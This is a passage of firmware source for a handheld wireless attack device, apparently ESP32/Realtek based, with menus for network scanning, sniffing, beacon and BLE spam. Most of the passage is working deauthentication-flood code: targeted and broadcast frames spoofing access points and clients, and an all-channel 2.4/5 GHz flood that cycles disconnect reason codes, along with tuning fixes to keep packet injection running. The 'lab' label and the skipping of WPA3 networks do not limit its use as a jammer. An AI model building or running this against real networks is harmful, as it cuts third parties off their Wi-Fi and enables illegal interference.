  // Stop any active attack/scan tools
  beaconSpamStop();
  bleSpamStop();
  sniffStop();
  clientScanStop();
  if (bleActive()) {
    bleStop();
    bleMarkStackStopped();
  }
  
  // Turn off status LEDs
  ledAllOff();
  setLedMode(LED_MODE_IDLE);
  
  // Double beep to confirm emergency stop
  buzzerBeep(1000, 80);
  delay(60);
  buzzerBeep(1000, 80);
  
  if (getSystemMode() == SYS_MODE_SLAVE) {
    uiState = UI_SLAVE_LINKED;
    uiDrawSlaveLinked("TetraX ESP32");
    uartSendStatus("IDLE");
  } else {
    // Always go back to main menu
    drawMainMenu();
  }
}

// ─────────────────────────────────────────────────────────────
//  Menu actions
// ─────────────────────────────────────────────────────────────

void openMainMenuItem() {
  switch (mainMenuIndex) {
    case 0:
      // Scan Networks -> If already scanned, open list; if none, scan first
      if (wifiScannerCount() == 0) {
        runScan();
      } else {
        selectedNetwork = 0;
        listTop = 0;
        uiState = UI_NETWORK_LIST;
        uiDrawNetworkListAll(selectedNetwork, listTop);
      }
      break;
    case 1:
      // Target / Deauth -> If target selected, open its action menu; else open network list to select one
      if (targetHasSelection()) {
        int idx = wifiScannerFindBssid(targetGet().bssid);
        actionNetworkIdx = (idx >= 0) ? idx : 0;
        actionMenuIndex = 0;
        uiState = UI_ACTION_MENU;
        uiDrawActionMenu(targetGet(), actionMenuIndex);
      } else {
        selectedNetwork = 0;
        listTop = 0;
        uiState = UI_NETWORK_LIST;
        uiDrawNetworkListAll(selectedNetwork, listTop);
      }
      break;
    case 2:
      // Deauth 5G (All Channels)
      runDeauthAllChannels(5);
      break;
    case 3:
      // Deauth 2.4G (All Channels)
      runDeauthAllChannels(2);
      break;
    case 4:
      // Beacon Spam
      selectedBand = 2;
      uiState = UI_BAND_MENU;
      uiDrawBandMenu(selectedBand);
      break;
    case 5:
      // Sniffer
      startSniffer(2);
      break;
    case 6:
      // BLE Tools
      drawBleMenu();
      break;
    case 7:
      // IR Remote
      uiState = UI_IR_MENU;
      irMenuIndex = 0;
      uiDrawIrMenu(irMenuIndex);
      break;
    case 8: {
      // System Settings
      uiState = UI_SYSTEM_SETTINGS;
      systemSettingsIndex = 0;
      uiDrawSystemSettings(systemSettingsIndex, g_buzzerEnabled, g_ledEnabled);
      break;
    }
  }
}

void openBleMenuItem() {
  switch (bleMenuIndex) {
    case 0: // Scan devices
      bleResetList();
      if (bleStart()) {
        selectedBleDevice = -1;
        bleListTop = 0;
        uiState = UI_BLE_LIST;
        uiDrawBleList(selectedBleDevice, bleListTop);
      } else {
        showPlaceholder("BLE Scan", "Failed to start");
      }
      break;
    case 1: // Analyzer
      if (bleActive()) {
        bleAnalyzerReset();
        uiState = UI_BLE_ANALYZER;
        uiDrawBleAnalyzer();
      } else if (bleStart()) {
        bleAnalyzerReset();
        uiState = UI_BLE_ANALYZER;
        uiDrawBleAnalyzer();
      } else {
        showPlaceholder("BLE Analyzer", "Failed to start");
      }
      break;
    case 2: // BLE Spam
      if (bleSpamStart()) {
        uiState = UI_BLE_SPAM;
        uiDrawBleSpam();
      } else {
        showPlaceholder("BLE Spam", "Failed to start");
      }
      break;
    case 3: // Back
      drawMainMenu();
      break;
  }
}

// ─────────────────────────────────────────────────────────────
// ─────────────────────────────────────────────────────────────
//  Deauth Lab
// ─────────────────────────────────────────────────────────────

void runDeauthLab() {
  if (!targetHasSelection()) {
    showPlaceholder("Deauth", "No target set");
    return;
  }

  const NetworkInfo &target = targetGet();
  UiState returnState = uiState;

  labInjectionStoppedByUser = false;
  bool anySent = runPacketInjectionLab();

  if (anySent) {
    ledFlashGreen(2, 100);
    buzzerSuccess();
  } else {
    ledFlashRed(2, 150);
    buzzerError();
  }

  returnToDeauthCaller(returnState);
}

// Forward declaration of runDeauthLabTargeted's inner function
bool runPacketInjectionLabTargeted(const uint8_t *dstMac);

void runDeauthLabTargeted(const uint8_t *dstMac) {
  if (!targetHasSelection()) {
    showPlaceholder("Deauth", "No target set");
    return;
  }

  const NetworkInfo &target = targetGet();
  UiState returnState = uiState;

  labInjectionStoppedByUser = false;
  bool anySent = runPacketInjectionLabTargeted(dstMac);

  if (anySent) {
    ledFlashGreen(2, 100);
    buzzerSuccess();
  } else {
    ledFlashRed(2, 150);
    buzzerError();
  }

  returnToDeauthCaller(returnState);
}

bool runPacketInjectionLabTargeted(const uint8_t *dstMac) {
  const NetworkInfo &target = targetGet();

  uint8_t targetMac[6];
  if (!parseMacAddress(target.bssid, targetMac)) {
    uiDrawStatus("Bad MAC address");
    ledFlashRed(3, 100);
    buzzerError();
    delay(900);
    return false;
  }

  if (isInjectionBlockedSecurity(target.security)) {
    uiDrawStatus("WPA3 - Protected");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  // Draw activating screen
  uiDrawGenericMessage("ATTACK INIT", "Activating Mode...", "Please wait");
  ledFlashGreen(1, 100);

  // Full radio reset to ensure PLL locks onto target channel (especially 5GHz ch 161)
  wifi_off();
  delay(150);
  wifi_on(RTW_MODE_STA);
  delay(150);
  wifi_change_channel_plan(0x7F);
  delay(100);
  wifi_set_channel(target.channel);
  delay(80);

  // CRITICAL FIX: Enable Promiscuous Mode to bypass MAC state machine filtering
  // Without this, the MAC refuses to transmit raw frames on 5GHz, filling the queue until the CPU crashes.
  wifi_set_promisc(3, NULL, 0); // 3 = RTW_PROMISC_ENABLE_2

  // Draw full deauth attack screen with live counter
  uiDrawDeauthScreen(target.ssid, target.channel, target.channel >= 36, 0);

  bool anySent = false;
  uint32_t sentCount = 0;
  uint32_t failCount = 0;
  uint32_t lastUiUpdate = millis();
  uint32_t lastPpsCalc = millis();
  uint32_t lastSentForPps = 0;
  uint16_t currentPps = 0;

  uint8_t dstMacBuf[6];
  memcpy(dstMacBuf, dstMac, 6);

  txProbeReset();

  while (true) {
    if (anyButtonPressed()) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    UartCommand cmd = uartPollCommand();
    if (cmd.type == UART_CMD_STOP || cmd.type == UART_CMD_BACK) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    // Burst loop: 20 packets (keeps it well below the 95-frame crash limit)
    for (uint8_t burst = 0; burst < 10; burst++) {
      if (anyButtonPressed()) {
        return stopPacketInjectionLab(anySent, sentCount);
      }

      bool sent1 = wifi_tx_deauth_frame(targetMac, dstMacBuf, targetMac, LAB_DEAUTH_REASON);
      if (sent1) {
        anySent = true;
        sentCount++;
      } else {
        failCount++;
        delay(20);
      }
      delay(15);

      bool sent2 = wifi_tx_deauth_frame(dstMacBuf, targetMac, targetMac, LAB_DEAUTH_REASON);
      if (sent2) {
        anySent = true;
        sentCount++;
      } else {
        failCount++;
        delay(20);
      }
      delay(15);
    }

    // CRITICAL FIX: Explicit DMA flush yield.
    delay(100);

    if (millis() - lastPpsCalc >= 1000) {
      currentPps = (uint16_t)(sentCount - lastSentForPps);
      lastSentForPps = sentCount;
      lastPpsCalc = millis();
    }

    if (millis() - lastUiUpdate > 80) {
      lastUiUpdate = millis();
      uiRefreshDeauthLive(target.channel, sentCount, failCount, currentPps, false, target.ssid);
      uartSendLiveStats(target.channel, sentCount, failCount, currentPps);
    }

    delay(20);
    yield();
  }
}

bool runPacketInjectionLab() {
  const NetworkInfo &target = targetGet();

  uint8_t targetMac[6], broadcastMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  if (!parseMacAddress(target.bssid, targetMac)) {
    uiDrawStatus("Bad MAC address");
    ledFlashRed(3, 100);
    buzzerError();
    delay(900);
    return false;
  }

  if (isInjectionBlockedSecurity(target.security)) {
    uiDrawStatus("WPA3 - Protected");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  // Draw activating screen
  uiDrawGenericMessage("ATTACK INIT", "Activating Mode...", "Please wait");
  ledFlashGreen(1, 100);

  // Full radio reset to ensure PLL locks onto target channel (especially 5GHz ch 161)
  wifi_off();
  delay(150);
  wifi_on(RTW_MODE_STA);
  delay(150);
  wifi_change_channel_plan(0x7F);
  delay(100);
  wifi_set_channel(target.channel);
  delay(80);

  // CRITICAL FIX: Enable Promiscuous Mode to bypass MAC state machine filtering
  wifi_set_promisc(3, NULL, 0); // 3 = RTW_PROMISC_ENABLE_2

  // Draw full deauth attack screen with live counter
  uiDrawDeauthScreen(target.ssid, target.channel, target.channel >= 36, 0);

  bool anySent = false;
  uint32_t sentCount = 0;
  uint32_t failCount = 0;
  uint32_t lastUiUpdate = millis();
  uint32_t lastPpsCalc = millis();
  uint32_t lastSentForPps = 0;
  uint16_t currentPps = 0;

  txProbeReset();

  while (true) {
    if (anyButtonPressed()) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    UartCommand cmd = uartPollCommand();
    if (cmd.type == UART_CMD_STOP || cmd.type == UART_CMD_BACK) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    // Burst loop: 20 packets (keeps it well below the 95-frame crash limit)
    for (uint8_t burst = 0; burst < 20; burst++) {
      if (anyButtonPressed()) {
        return stopPacketInjectionLab(anySent, sentCount);
      }

      bool sent = wifi_tx_deauth_frame(targetMac, broadcastMac, targetMac, LAB_DEAUTH_REASON);
      if (sent) {
        anySent = true;
        sentCount++;
      } else {
        failCount++;
        delay(20);
      }

      delay(15);
    }

    // CRITICAL FIX: Explicit DMA flush yield.
    delay(100);

    if (millis() - lastPpsCalc >= 1000) {
      currentPps = (uint16_t)(sentCount - lastSentForPps);
      lastSentForPps = sentCount;
      lastPpsCalc = millis();
    }

    if (millis() - lastUiUpdate > 80) {
      lastUiUpdate = millis();
      uiRefreshDeauthLive(target.channel, sentCount, failCount, currentPps, false, target.ssid);
      uartSendLiveStats(target.channel, sentCount, failCount, currentPps);
    }

    delay(20);
    yield();
  }
}

bool runDeauthAllChannels(uint8_t band) {
  // If no APs scanned yet, run a scan first to learn real target BSSIDs
  if (wifiScannerCount() == 0) {
    runScan();
    if (wifiScannerCount() == 0) {
      uiDrawStatus("No APs Scanned");
      delay(800);
      drawMainMenu();
      return false;
    }
  }

  static const uint8_t CHANNELS_24[] = { 1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13 };
  static const uint8_t CHANNELS_5[]  = { 36, 40, 44, 48, 149, 153, 157, 161 };

  uint8_t count = (band == 5) ? (uint8_t)(sizeof(CHANNELS_5) / sizeof(CHANNELS_5[0])) : (uint8_t)(sizeof(CHANNELS_24) / sizeof(CHANNELS_24[0]));
  const uint8_t *chList = (band == 5) ? CHANNELS_5 : CHANNELS_24;

  uiDrawGenericMessage("ALL-CH ATTACK", band == 5 ? "5GHz All Channels" : "2.4GHz All Channels", "Activating Mode...");
  ledFlashGreen(1, 100);

  // Pre-parse all scanned AP BSSIDs into binary MAC arrays
  uint8_t totalAPs = wifiScannerCount();
  uint8_t apMacs[MAX_NETWORKS][6];
  uint8_t apChs[MAX_NETWORKS];
  for (uint8_t i = 0; i < totalAPs && i < MAX_NETWORKS; i++) {
    const NetworkInfo &n = wifiScannerNetwork(i);
    parseMacAddress(n.bssid, apMacs[i]);
    apChs[i] = n.channel;
  }

  wifi_off();
  delay(150);
  wifi_on(RTW_MODE_STA);
  delay(150);
  wifi_change_channel_plan(0x7F);
  delay(100);
  wifi_set_promisc(3, NULL, 0);

  bool anySent = false;
  uint32_t sentCount = 0;
  uint32_t failCount = 0;
  uint32_t lastUiUpdate = millis();
  uint32_t lastPpsCalc = millis();
  uint32_t lastSentForPps = 0;
  uint16_t currentPps = 0;
  uint8_t broadcastMac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

  // Standard multi-reason codes for total device disconnection across all vendor chipsets
  static const uint16_t REASONS[] = { 0x0007, 0x0002, 0x0006, 0x0001 };

  uiDrawDeauthScreen(band == 5 ? "ALL 5G CHANNELS" : "ALL 2.4G CHANNELS", chList[0], band == 5, 0);

  uint8_t chIndex = 0;

  while (true) {
    if (attackStopRequested()) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    UartCommand cmd = uartPollCommand();
    if (cmd.type == UART_CMD_STOP || cmd.type == UART_CMD_BACK) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    uint8_t curCh = chList[chIndex];
    wifi_set_channel(curCh);
    delay(15);

    // Send deauth using REAL BSSIDs of scanned APs on this channel
    bool foundAP = false;
    for (uint8_t ap = 0; ap < totalAPs && ap < MAX_NETWORKS; ap++) {
      if (apChs[ap] != curCh) continue;
      foundAP = true;

      // Heavy multi-reason flood for every AP on this channel
      for (uint8_t r = 0; r < 4; r++) {
        uint16_t rCode = REASONS[r];
        for (uint8_t burst = 0; burst < 3; burst++) {
          if (attackStopRequested()) return stopPacketInjectionLab(anySent, sentCount);

          // Direction 1: AP -> Broadcast deauth (spoof AP kicking all clients)
          bool s1 = wifi_tx_deauth_frame(apMacs[ap], broadcastMac, apMacs[ap], rCode);
          if (s1) { anySent = true; sentCount++; } else { failCount++; }
          delay(2);

          // Direction 2: Client -> AP deauth (spoof client disconnecting)
          bool s2 = wifi_tx_deauth_frame(broadcastMac, apMacs[ap], apMacs[ap], rCode);
          if (s2) { sentCount++; } else { failCount++; }
          delay(2);
        }
      }
    }

    // Fallback if no scanned AP is specifically on this channel
    if (!foundAP) {
      for (uint8_t b = 0; b < 3; b++) {
        wifi_tx_deauth_frame(broadcastMac, broadcastMac, broadcastMac, LAB_DEAUTH_REASON);
        sentCount++;
        delay(4);
      }
    }

    delay(25);

    if (millis() - lastPpsCalc >= 1000) {
      currentPps = (uint16_t)(sentCount - lastSentForPps);
      lastSentForPps = sentCount;
      lastPpsCalc = millis();
    }

    if (millis() - lastUiUpdate > 80) {
      lastUiUpdate = millis();
      uiRefreshDeauthLive(curCh, sentCount, failCount, currentPps, true, band == 5 ? "ALL 5G" : "ALL 2.4G");
      uartSendLiveStats(curCh, sentCount, failCount, currentPps);
    }

    chIndex = (chIndex + 1) % count;
  }
}


bool stopPacketInjectionLab(bool anySent, uint32_t sentCount) {
  labInjectionStoppedByUser = true;
  ledAllOff();
  uiDrawStatus("Stopped");
  buzzerClick();

  // Print in-memory telemetry probe log upon stop
  txProbePrintReport();
  
  // Clean radio restore
  wifi_set_promisc(0, NULL, 0);
  wifi_off();
  delay(100);
  wifi_on(RTW_MODE_STA);
  wifi_change_channel_plan(0x7F);
  delay(150);

  if (getSystemMode() == SYS_MODE_SLAVE) {
    uiState = UI_SLAVE_LINKED;
    uiDrawSlaveLinked("TetraX ESP32");
    uartSendStatus("STOPPED", sentCount);
  }

  waitForLabButtonsReleased();
  return anySent;
}

void returnToDeauthCaller(UiState returnState) {
  if (returnState == UI_PLACEHOLDER) { drawMainMenu(); return; }
  if (returnState == UI_NETWORK_DETAILS) {
    uiState = UI_NETWORK_LIST;
    uiDrawNetworkListAll(selectedNetwork, listTop);
    return;
  }
  if (returnState == UI_ACTION_MENU) {
    uiState = UI_ACTION_MENU;
    uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
    return;
  }
  drawMainMenu();
}

bool labStopRequested() {
  return anyButtonPressed();
}

void waitForLabButtonsReleased() {
  while (okPressed() || navPressed()) delay(20);
}

bool isInjectionBlockedSecurity(uint32_t security) {
  return security == RTW_SECURITY_WPA3_AES_PSK ||
         security == RTW_SECURITY_WPA2_WPA3_MIXED ||
         security == RTW_SECURITY_WPA2_AES_CMAC;
}

bool parseMacAddress(const char *text, uint8_t mac[6]) {
  if (strlen(text) != 17) return false;
  for (uint8_t i = 0; i < 6; i++) {
    int high = hexValue(text[i * 3]);
    int low  = hexValue(text[i * 3 + 1]);
    if (high < 0 || low < 0) return false;
    mac[i] = (high << 4) | low;
    if (i < 5 && text[i * 3 + 2] != ':') return false;
  }
  return true;
}

int hexValue(char value) {
  if (value >= '0' && value <= '9') return value - '0';
  if (value >= 'A' && value <= 'F') return value - 'A' + 10;
  if (value >= 'a' && value <= 'f') return value - 'a' + 10;
  return -1;
}

// ─────────────────────────────────────────────────────────────
//  Target helpers
// ─────────────────────────────────────────────────────────────

void runTargetRefresh() {
  if (!targetHasSelection()) {
    showPlaceholder("Re-scan", "No target set yet");
    return;
  }

  char targetBssid[18];
  strncpy(targetBssid, targetGet().bssid, sizeof(targetBssid));
  targetBssid[sizeof(targetBssid) - 1] = '\0';

  if (!labStatsActive() || strcmp(labStatsGet().bssid, targetBssid) != 0) {
    labStatsReset(targetBssid);
  }

  ledYellowOn();
  uiDrawStatus("Scanning for target...");

  bool scanOk   = wifiScannerScan();
  int foundIndex = scanOk ? wifiScannerFindBssid(targetBssid) : -1;

  ledYellowOff();

  if (foundIndex >= 0) {
    targetSet(wifiScannerNetwork(foundIndex));
    labStatsAdd(true, &targetGet());
    selectedNetwork = foundIndex;
    selectedBand    = wifiScannerIs5GHz(targetGet().channel) ? 5 : 2;
    uiState = UI_TARGET_MONITOR;
    uiDrawTargetMonitor(targetGet(), true);
    ledFlashGreen(1, 120);
    buzzerScanDone();
  } else {
    labStatsAdd(false, NULL);
    uiState = UI_TARGET_MONITOR;
    uiDrawTargetMonitor(targetGet(), false);
    ledFlashRed(1, 120);
  }

  labStatsPrintToSerial();
  delay(250);
}

bool sameTarget(uint8_t networkIndex) {
  if (!targetHasSelection()) return false;
  return strcmp(targetGet().bssid, wifiScannerNetwork(networkIndex).bssid) == 0;
}

void showPlaceholder(const char *title, const char *message) {
  uiState = UI_PLACEHOLDER;
  uiDrawStatus(title);
  delay(500);
  uiDrawStatus(message);
}

// ─────────────────────────────────────────────────────────────
//  WiFi scan
// ─────────────────────────────────────────────────────────────

void runScan() {
  setLedMode(LED_MODE_SCANNING);
  selectedNetwork = 0;
  listTop = 0;

  // Render initial scan frame immediately (0ms instant transition)
  uiDrawScanCountdown(5, 0, 0, 0);

  if (!wifiScannerStartScan()) {
    setLedMode(LED_MODE_IDLE);
    ledFlashRed(2, 100);
    buzzerError();
    uiDrawStatus("Scan failed");
    delay(1200);
    drawMainMenu();
    return;
  }

  // 5-Second Scan Melody (Mission Impossible / Cyber Scan Chiptune)
  struct ScanMelodyStep {
    uint16_t freq;  // Pitch (Hz)
    uint16_t dur;   // Sustain (ms)
    uint16_t pause; // Silence (ms)
    uint8_t  led;   // 1=Red, 2=Green, 3=Yellow, 4=All Three
  };

  static const ScanMelodyStep SCAN_MELODY[] = {
    // 5/4 Rhythmic Pattern: Dun-Dun-DA-DA | Dun-Dun-DA-DA
    { 392, 100, 40, 1 }, // Note 0:  G4  -> RED (pulse 1)
    { 392, 100, 40, 1 }, // Note 1:  G4  -> RED (pulse 2)
    { 466, 140, 40, 3 }, // Note 2:  Bb4 -> YELLOW (high accent 1)
    { 523, 140, 40, 2 }, // Note 3:  C5  -> GREEN (high accent 2)

    { 392, 100, 40, 1 }, // Note 4:  G4  -> RED (pulse 1)
    { 392, 100, 40, 1 }, // Note 5:  G4  -> RED (pulse 2)
    { 349, 140, 40, 3 }, // Note 6:  F4  -> YELLOW (low accent 1)
    { 370, 140, 40, 2 }, // Note 7:  F#4 -> GREEN (low accent 2)

    { 392, 100, 40, 1 }, // Note 8:  G4  -> RED (pulse 1)
    { 392, 100, 40, 1 }, // Note 9:  G4  -> RED (pulse 2)
    { 466, 140, 40, 3 }, // Note 10: Bb4 -> YELLOW (high accent 1)
    { 523, 140, 40, 2 }, // Note 11: C5  -> GREEN (high accent 2)

    { 392, 100, 40, 1 }, // Note 12: G4  -> RED (pulse 1)
    { 392, 100, 40, 1 }, // Note 13: G4  -> RED (pulse 2)
    { 349, 140, 40, 3 }, // Note 14: F4  -> YELLOW (low accent 1)
    { 370, 140, 40, 2 }, // Note 15: F#4 -> GREEN (low accent 2)

    // Climax & Cadence
    { 466, 200, 50, 3 }, // Note 16: Bb4 -> YELLOW (leap)
    { 440, 200, 50, 2 }, // Note 17: A4  -> GREEN (step)
    { 392, 300, 60, 1 }, // Note 18: G4  -> RED (base hold)
    { 587, 200, 50, 3 }, // Note 19: D5  -> YELLOW (flare)
    { 523, 200, 50, 2 }, // Note 20: C5  -> GREEN (step)
    { 466, 200, 50, 3 }, // Note 21: Bb4 -> YELLOW (step)
    { 392, 400, 80, 4 }  // Note 22: G4  -> ALL THREE (Grand Finish!)
  };
  const size_t noteCount = sizeof(SCAN_MELODY) / sizeof(SCAN_MELODY[0]);

  uint32_t scanStartTime = millis();
  uint8_t noteIndex = 0;
  uint8_t animFrame = 0;

  while (millis() - scanStartTime < 5000) {
    // Check if user holds touch sensor (>800ms) or presses NAV button to cancel scan
    if (attackStopRequested()) {
      bool dummy = false;
      wifiScannerPollScan(&dummy);
      buzzerClick();
      ledMelodySet(0);
      ledSetOnboardPurple();
      setLedMode(LED_MODE_IDLE);
      uiDrawStatus("Scan Cancelled");
      delay(400);
      drawMainMenu();
      return;
    }

    uint32_t elapsed = millis() - scanStartTime;
    uint8_t remaining = (elapsed < 5000) ? (5 - (elapsed / 1000)) : 1;

    // Draw scanning animation with dynamic countdown and AP blips
    uiDrawScanCountdown(remaining, elapsed, wifiScannerCount(), animFrame);
    animFrame++;

    // Play next note of the scan melody synchronized with LEDs
    if (noteIndex < noteCount) {
      ledStepRGY(noteIndex);
      playTone(SCAN_MELODY[noteIndex].freq, SCAN_MELODY[noteIndex].dur);
      ledMelodySet(0);
      if (SCAN_MELODY[noteIndex].pause > 0) {
        delay(SCAN_MELODY[noteIndex].pause);
      }
      noteIndex++;
    } else {
      delay(40);
    }
  }

  // Finalize scan result
  bool scanOk = false;
  wifiScannerPollScan(&scanOk);

  // Scan completed celebration
  ledMelodySet(0);
  ledFlashGreen(3, 80);
  ledSetOnboardPurple();
  setLedMode(LED_MODE_IDLE);
  buzzerScanDone();

  selectedNetwork = 0;
  listTop = 0;
  uiState = UI_NETWORK_LIST;
  uiDrawNetworkListAll(selectedNetwork, listTop);
}

// ─────────────────────────────────────────────────────────────
//  Index / scroll helpers
// ─────────────────────────────────────────────────────────────

uint8_t nextIndex(uint8_t current, uint8_t count) {
  return (current + 1) % count;
}

uint8_t previousIndex(uint8_t current, uint8_t count) {
  return current == 0 ? count - 1 : current - 1;
}

uint8_t nextBandOption(uint8_t current) {
  return current == 5 ? 2 : 5;
}

void moveSelectionAll(int delta) {
  int total = (int)wifiScannerCount();
  if (total == 0) {
    runScan();
    return;
  }

  int itemCount = total + 2; // +1 for [ RE-SCAN ], +1 for [ Back ]

  if (delta > 0) {
    selectedNetwork = (selectedNetwork + 1) % itemCount;
  } else {
    selectedNetwork = (selectedNetwork - 1 + itemCount) % itemCount;
  }

  if (selectedNetwork >= 0 && selectedNetwork < listTop)
    listTop = selectedNetwork;
  if (selectedNetwork >= listTop + UI_MENU_VISIBLE)
    listTop = selectedNetwork - (UI_MENU_VISIBLE - 1);
  if (listTop < 0) listTop = 0;

  uiDrawNetworkListAll(selectedNetwork, listTop);
  delay(150);
}

void selectFirstNetworkInBand() {
  selectedNetwork = -1;
  listTop = 0;
  for (uint8_t i = 0; i < wifiScannerCount(); i++) {
    if (wifiScannerNetworkInBand(i, selectedBand)) {
      selectedNetwork = i;
      listTop = i;
      break;
    }
  }
  uiState = UI_NETWORK_LIST;
}

void normalizeListTop() {
  if (selectedNetwork == -1) {
    for (uint8_t i = 0; i < wifiScannerCount(); i++) {
      if (wifiScannerNetworkInBand(i, selectedBand)) { listTop = i; return; }
    }
    listTop = 0;
    return;
  }
  if (selectedNetwork < listTop) { listTop = selectedNetwork; return; }
  uint8_t rows = 0;
  for (uint8_t i = listTop; i < wifiScannerCount(); i++) {
    if (!wifiScannerNetworkInBand(i, selectedBand)) continue;
    rows++;
    if ((int)i == selectedNetwork) return;
    if (rows >= 4) { listTop = selectedNetwork; return; }
  }
}

// ─────────────────────────────────────────────────────────────
//  BLE list navigation
// ─────────────────────────────────────────────────────────────

void moveBleSelection(int delta) {
  int total = (int)bleCount();
  if (total == 0) { selectedBleDevice = -1; return; }

  if (delta > 0) {
    if (selectedBleDevice < total - 1) selectedBleDevice++;
    else                               selectedBleDevice = -1;
  } else {
    if (selectedBleDevice == -1) selectedBleDevice = total - 1;
    else if (selectedBleDevice > 0) selectedBleDevice--;
    else                            selectedBleDevice = -1;
  }

  if (selectedBleDevice >= 0 && selectedBleDevice < bleListTop)
    bleListTop = selectedBleDevice;
  if (selectedBleDevice >= bleListTop + 4)
    bleListTop = selectedBleDevice - 3;
  if (bleListTop < 0) bleListTop = 0;

  uiRefreshBleList(selectedBleDevice, bleListTop);
  delay(150);
}

// ─────────────────────────────────────────────────────────────
//  Exit / close helpers
// ─────────────────────────────────────────────────────────────

void closeBleAnalyzer() {
  bleStop();
  bleMarkStackStopped();
  drawBleMenu();
}

void closeBleScanList() {
  bleStop();
  bleMarkStackStopped();
  drawBleMenu();
}

void exitBeaconSpam() {
  beaconSpamStop();
  ledYellowOff();
  drawMainMenu();
}

void exitBleSpam() {
  bleSpamStop();
  ledYellowOff();
  drawBleMenu();
}

void exitWifiAnalyzer() {
  sniffStop();
  ledYellowOff();
  drawMainMenu();
}

void exitSniffer() {
  sniffStop();
  ledYellowOff();
  drawMainMenu();
}

void startSniffer(uint8_t band) {
  if (sniffStart(band)) {
    uiState = UI_SNIFFER;
    uiDrawSniffer(sniffGetStats());
    ledYellowOn();
  } else {
    showPlaceholder("Sniffer", "Failed to start");
    buzzerError();
  }
}





